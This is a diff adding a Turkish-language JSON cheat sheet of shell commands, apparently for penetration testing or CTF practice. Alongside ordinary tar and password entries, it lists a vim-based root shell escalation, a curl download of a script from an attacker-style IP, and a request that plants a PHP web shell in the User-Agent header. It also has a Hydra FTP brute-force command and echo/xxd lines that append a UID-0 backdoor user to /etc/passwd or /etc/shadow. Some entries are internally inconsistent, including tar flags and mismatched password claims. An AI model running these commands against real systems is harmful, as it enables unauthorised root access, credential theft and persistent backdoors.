@@ -1,0 +1,119 @@
+{
+    "chpasswd": {
+        "desc": "Sistem kullanıcısı parolasını değiştirme",
+        "command": "echo 'aurora:passwd' | chpasswd",
+        "usage": "Linux sisteminde kullanıcı parolasını değiştirmek için",
+        "examples": [
+            "echo 'aurora:passwd' | chpasswd",
+            "echo 'user:passwd' | sudo chpasswd"
+        ],
+        "category": "user_management",
+        "permissions": "root_required"
+    },
+    "snmpwalk": {
+        "desc": "SNMP kullanarak ağ cihazlarından bilgi toplama",
+        "command": "snmpwalk -v 2c -c public alexriveraexplorer.hv NET-SNMP-EXTEND-MIB::nsExtendOutputFull",
+        "usage": "Belirtilen SNMP cihazından NET-SNMP-EXTEND-MIB::nsExtendOutputFull değerini okumak için",
+        "examples": [
+            "snmpwalk -v 2c -c public alexriveraexplorer.hv NET-SNMP-EXTEND-MIB::nsExtendOutputFull"
+        ],
+        "category": "network_management",
+        "permissions": "read_access"
+    },
+    "passwd": {
+        "desc": "Kullanıcı parolasını interaktif değiştirme",
+        "command": "echo newpw | passwd aurora",
+        "usage": "Belirtilen kullanıcının parolasını değiştirmek için",
+        "category": "user_management",
+        "type": "credential_modification"
+    },
+    "vim_privilege_escalation": {
+        "desc": "Vim ile privilege escalation",
+        "command": "vim -c ':python3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
+        "usage": "Vim python desteği kullanarak root yetkisi elde etmek için",
+        "category": "privilege_escalation",
+        "type": "binary_exploitation",
+        "security": "high_risk",
+        "requirements": "vim python3 support"
+    },
+    "nmap_vuln_scan": {
+        "desc": "Nmap ile zafiyet taraması",
+        "command": "nmap -sV --script vuln cipherstorm.hv",
+        "usage": "Hedef sistemde bilinen zafiyetleri taramak için",
+        "category": "reconnaissance",
+        "type": "vulnerability_scanning",
+        "flags": {
+            "-sV": "Servis versiyonu tespiti",
+            "--script vuln": "Zafiyet tarama scriptleri"
+        }
+    },
+
+    "curl_download": {
+        "desc": "Curl ile dosya indirme",
+        "commands": [
+            "curl -O -L 'http://10.8.19.24:8000/prev.sh'",
+            "curl -X GET -H \"Referer: <WebsiteSubdir>\" -H \"User-Agent: <?php system($_GET['cmd']); ?>\" -H \"Content-Type: */*\" -b \"PHPSESSID=q2rvsbb6drdb9qcqqvrnhirngt\" <WebSite>"
+        ],
+        "usage": "Uzak sunucudan dosya indirmek için",
+        "category": "file_transfer",
+        "flags": {
+            "-O": "Dosyayı orijinal adıyla kaydet",
+            "-L": "Yönlendirmeleri takip et",
+            "-X": "HTTP isteği türünü belirt (GET, POST, vb.)",
+            "-H": "HTTP başlıklarını ekle",
+            "-b": "Çerezleri gönder"
+        }
+    },
+    "tar_backup": {
+        "desc": "Tar ile dosya arşivleme",
+        "command": ["tar -xvf {archive} {file_name}", "tar -xvf file.tar foo.txt", "tar -xzvf file.tar.gz foo.txt", "tar -xjvf file.tar.bz2 foo.txt"],
+        "usage": "Belirtilen dizinleri sıkıştırılmış arşiv haline getirmek için",
+        "category": "file_operations",
+        "flags": {
+            "-c": "Arşiv oluştur",
+            "-z": "Gzip sıkıştırması",
+            "-v": "Verbose çıktı",
+            "-f": "Dosya adı belirt"
+        }
+    },
+    "tar_extract": {
+        "desc": "Tar ile dosya cikartma",
+        "command": ["tar -xvf file.tar", "tar -xzvf file.tar.gz", "tar -xjvf file.tar.bz2"],
+        "usage": "Belirtilen dizinleri sıkıştırılmış arşiv haline getirmek için",
+        "category": "file_operations",
+        "flags": {
+            "-c": "Arşiv oluştur",
+            "-z": "Gzip sıkıştırması",
+            "-v": "Verbose çıktı",
+            "-f": "Dosya adı belirt"
+        }
+    },
+    "hydra_brute_force": {
+        "desc": "Hydra ile FTP brute force saldırısı",
+        "command": "hydra -f -C ftp-betterdefaultpasslist.txt 172.20.9.147 ftp -V",
+        "usage": "FTP servisine karşı parola sözlük saldırısı yapmak için",
+        "category": "brute_force",
+        "type": "credential_attack",
+        "flags": {
+            "-f": "İlk başarılı girişte dur",
+            "-C": "Username:password formatındaki dosya",
+            "-V": "Verbose çıktı"
+        },
+        "security": "high_risk"
+    },
+    "Change Known Hash /etc/shadow or /etc/passwd": {
+        "desc": "Linuxta yescrypt ile hashlenerek tutulan parolayı bilinen bir hash ile değiştirebilirsiniz.",
+        "command": "echo \"A\" >> /etc/shadow",
+        "usage": {
+            "1.": "Adding this line is create \"user1\" with password test123 and all privliges is root.",
+            "2.": "Hash Password is \"n0r00t\"",
+            "3.": "echo 'user_hashed_row'| xxd | xxd -r - \"/etc/shadow\"",
+            "4.": "printf \"user_hashed_row\"| xxd | xxd -r - \"/etc/shadow\""
+        },
+        "flags": {
+            "1.": "user1:$1$user1$Nka.0tKoxdFKM2nMF3w.q1:0:0:,,,:/root/root:/bin/bash",
+            "2.": "$y$j9T$RRRf826.5Kmlt8FNFLz8n0$OZPASNeQ0MNPGt0tlgahHyoYCPTpd6awAGHDumFbYb3"
+        },
+        "security": "high_risk"
+    }
+}
